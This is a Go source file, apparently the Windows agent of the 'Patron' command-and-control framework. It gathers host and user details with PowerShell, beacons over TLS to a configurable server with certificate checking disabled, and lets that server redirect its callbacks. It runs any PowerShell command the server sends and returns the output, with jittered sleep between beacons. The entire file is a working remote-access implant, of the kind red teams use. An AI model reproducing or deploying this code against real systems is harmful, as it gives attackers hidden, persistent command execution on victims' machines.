package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/lib/common"
)

var (
	ServerIP			string
	ServerPort			string
	CallbackFrequency	string
	CallbackJitter		string
	RootCert			string
)

func main() {
	initialize()
	config, err := loadCertificate()
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	agentID, hostname, username := generateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)

	for {
		beacon, encoder, decoder, err := establishConnection(config)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := getLocalIP(beacon)
		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip); err != nil {
			handleError(beacon, "configuration", err)
			continue
		}

		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
			handleError(beacon, "command", err)
			continue
		}
		
		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		time.Sleep(time.Second * time.Duration(calculateSleepInterval()))
	}
}

func initialize() {
	logger.EnableLogging(true)
	if err := logger.SetLogFile("app.log"); err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
	}
	common.RegisterGobTypes()
}

func loadCertificate() (*tls.Config, error) {
	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publicKey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func generateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	hostname, username := executeCommand("hostname"), executeCommand("whoami")
	if hostname == "" { hostname = "unknown-host" }
	if username == "" { username = "unknown-user" }
	return agentID, hostname, username
}

func executeCommand(command string) string {
	output, _ := exec.Command("powershell", "-Command", command).Output()
	return strings.TrimSpace(string(output))
}

func establishConnection(config *tls.Config) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
	beacon, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", ServerIP, ServerPort), config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
		return nil, nil, nil, err
	}
	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
}

func getLocalIP(beacon *tls.Conn) string {
	return beacon.LocalAddr().(*net.TCPAddr).String()
}

func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip string) error {
	configReq := createConfigurationRequest(agentID, hostname, username, ip)
	if err := sendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
		return err
	}

	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.ConfigurationResponseType {
		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
			updateClientConfig(configResponse)
		} else {
			return fmt.Errorf("unexpected payload type")
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createConfigurationRequest(agentID, hostname, username, ip string) types.ConfigurationRequest {
	return types.ConfigurationRequest{
		AgentID:           agentID,
		Username:          username,
		Hostname:          hostname,
		AgentIP:           ip,
		ServerIP:          ServerIP,
		ServerPort:        ServerPort,
		CallbackFrequency: CallbackFrequency,
		CallbackJitter:    CallbackJitter,
		MasterKey:         "MASTERKEY",
	}
}

func updateClientConfig(config types.ConfigurationResponse) {
	updateConfigField(&ServerIP, config.ServerIP, "callback IP")
	updateConfigField(&ServerPort, config.ServerPort, "callback port")
	updateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
	updateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
}

func updateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}

func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Fetching commands to run")
	for {
		if err := sendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
			return err
		}

		var response types.Response
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command response: %v", err)
		}

		if response.Type == types.CommandResponseType {
			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
				commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
				if commandResult.CommandResult == "2" {
					break
				}
			} else {
				return fmt.Errorf("unexpected payload type")
			}
		} else {
			return fmt.Errorf("unexpected response type: %v", response.Type)
		}
	}
	return nil
}

func executeAndReportCommand(beacon *tls.Conn, encoder *gob.Encoder, instruct types.CommandResponse) types.CommandStatusRequest {
	commandResult := executeCommandRequest(&instruct)
	sendRequest(encoder, types.CommandStatusRequestType, commandResult)
	return commandResult
}

func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusRequest {
	if instruct.Command == "" && instruct.CommandType == "" {
		logger.Logf(logger.Info, "No command to execute.")
		return types.CommandStatusRequest{CommandResult: "2"}
	}

	var CmdOut, result string
	switch instruct.CommandType {
	case "shell":
		CmdOut, result = runShellCommand(instruct.Command), "1"
	case "kill":
		CmdOut, result = "~Killed~", "1"
	default:
		result = "2"
	}

	return types.CommandStatusRequest{
		AgentID:       instruct.AgentID,
		CommandID:     instruct.CommandID,
		CommandResult: result,
		CommandOutput: CmdOut,
	}
}

func runShellCommand(command string) string {
	cmd := exec.Command("powershell", "-Command", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func calculateSleepInterval() float64 {
	rand.Seed(time.Now().UnixNano())
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	variance := baseTime * jitterPercent * rand.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}

func sendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
}

func handleError(beacon *tls.Conn, reqType string, err error) {
	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
	beacon.Close()
	time.Sleep(2 * time.Second)
}
